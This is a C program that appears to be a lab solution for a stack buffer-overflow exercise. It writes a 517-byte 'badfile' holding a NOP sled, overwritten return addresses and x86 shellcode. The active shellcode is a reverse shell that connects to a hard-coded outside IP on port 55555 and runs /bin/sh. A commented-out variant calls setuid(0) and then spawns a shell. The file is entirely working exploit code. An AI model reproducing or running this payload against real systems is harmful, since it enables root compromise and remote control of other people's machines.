#include<stdio.h>
#include<stdlib.h>
#include<string.h>

//char shellcode[] =
//"\x31\xc0" /* Line 1: xorl %eax,%eax */
//"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
//"\xb0\xd5" /* Line 3: movb $0xd5,%al */
//"\xcd\x80" /* Line 4: int $0x80 */
//// ---- The code below is the same as the one in Task 2 ---
//"\x31\xc0"
//"\x50"
//"\x68""//sh"
//"\x68""/bin"
//"\x89\xe3"
//"\x50"
//"\x53"
//"\x89\xe1"
//"\x99"
//"\xb0\x0b"
//"\xcd\x80";
char shellcode[] = \
"\x68"
"\x67\x32\xfd\xbe"  // <- IP Number
"\x5e\x66\x68"
"\xd9\x03"          // <- Port Number "55555"
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\xeb\xce";

int main(int argc,char **argv){
      char buf[517];
      unsigned long ret,p;
      int i;
      FILE *badfile;


      p=&buf;
      ret=p+75;

     memset(buf,0x90,sizeof(buf));
     for(i=0;i<44;i+=4)
           *(long *)&buf[i]=ret;

     memcpy(buf+300+i,shellcode,strlen(shellcode));
     badfile = fopen("./badfile", "w");
     fwrite(buf, 517, 1, badfile);
     fclose(badfile);

     return 0;
}




